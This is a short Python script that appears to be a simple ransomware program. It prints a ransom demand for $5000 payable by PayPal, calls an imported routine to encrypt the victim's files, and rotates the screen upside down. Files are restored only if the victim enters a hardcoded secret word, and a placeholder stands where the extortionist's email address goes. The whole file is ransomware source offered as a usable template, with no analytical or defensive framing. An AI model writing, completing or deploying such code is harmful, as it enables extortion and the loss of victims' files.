import encrypt, decrypt, rotatescreen
secretword = "malware"
screen = rotatescreen.get_primary_display()
print("ALL FILES ABOVE HAVE BEEN ENCRYPTED.\nYOUR SCREEN IS ROTATED.\nTHE ONLY WAY TO FIX THIS IS:\n"
      "1- SEND ME $5000\n"
      "2- ENTER A SECRET WORD. IF ITS CORRECT, YOU'LL "
      "GET EVERYTHING BACK. ELSE, YOU'LL SEND ME $5000, AND I'LL GIVE YOU THE SECRET WORD.")
encrypt.encrypt()
screen.rotate_to(180)
ans = int(input("ENTER 1 OR 2: "))
if ans == 1:
      print("SEND ME $5000 ON PAYPAL. MY EMAIL ADDRESS IS : {your_email_address_here}")
elif ans == 2:
      chance = input("OK, TRY AND ENTER A SECRET WORD. THIS IS YOUR ONLY CHANCE: ")
      if chance == secretword:
            screen.rotate_to(0)
            decrypt.decrypt()
      else:
            print("WRONG\nSEND ME $5000 ON PAYPAL. MY EMAIL ADDRESS IS : {your_email_address_here}")
